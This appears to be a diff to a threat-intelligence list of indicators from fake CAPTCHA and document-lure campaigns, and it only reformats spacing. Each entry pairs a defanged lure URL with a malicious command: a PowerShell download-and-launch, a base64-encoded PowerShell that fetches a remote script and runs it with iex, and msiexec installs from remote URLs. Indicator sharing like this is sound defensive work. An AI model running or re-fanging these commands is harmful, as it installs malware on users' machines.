@@ -2,7 +2,9 @@
 
 ```
 hxxps[:]//setup-agreement[.]com
+
 powershell -Command "$file='C:\Users\Public\JGS_EXPRESS_INC_Broker_Carrier_Agreement.pdf.url'; Invoke-WebRequest -Uri 'hxxps[:]//setupagreement[.]com/JGS_EXPRESS_INC_Broker_Carrier_Agreement.pdf.url' -OutFile $file; Start-Sleep -Seconds 2; Start-Process $file"
+
 hxxp[:]//195[.]123[.]240[.]159[:]81/files/agreement[.]exe
 ```
 
@@ -12,7 +14,9 @@ hxxp[:]//195[.]123[.]240[.]159[:]81/files/agreement[.]exe
 
 ```
 hxxps[:]//www[.]aasiwins[.]com/captcha/?a
+
 powershell /ep bypass /enc JABhAD0AKABOAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcABzAGUAZQAuAGkAbwAvADcAawBwAHQAbABiACcAKQA7ACAAaQBlAFgAIAAkAGEAOwA= /W 2
+
 hxxps[:]//psee[.]io/7kptlb
 ```
 
@@ -20,6 +24,7 @@ hxxps[:]//psee[.]io/7kptlb
 
 ```
 hxxps[:]//www[.]localgrapevines[.]com
+
 msiexec /i hxxps[:]//suzume-design[.]com/cloudflare
 ```
 
@@ -29,7 +34,9 @@ msiexec /i hxxps[:]//suzume-design[.]com/cloudflare
 
 ```
 hxxps[:]//nutraforyou[.]com
-msiexec /i hxxps[:]//pizzabyte[.]com[.]au/smartdetection/deviceverification/CF/path/captcha
+msiexec /i
+
+hxxps[:]//pizzabyte[.]com[.]au/smartdetection/deviceverification/CF/path/captcha
 ```
 
 
